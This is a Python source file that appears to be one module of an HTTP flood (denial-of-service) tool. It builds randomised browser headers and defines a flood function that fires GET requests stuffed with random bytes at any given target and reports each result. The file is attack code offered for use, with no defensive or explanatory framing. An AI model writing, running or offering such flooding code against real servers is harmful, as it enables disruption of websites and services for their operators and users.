# Import modules
import requests
import random
import tools.randomData as randomData

# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}


def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"[!] Timed out")
    except Exception as e:
        print(
            f"Error while sending GET request\n{e}\n"
        )
    else:
        print(
            f"[{r.status_code}] Request sent! Payload size: {len(payload)}.\n"
        )
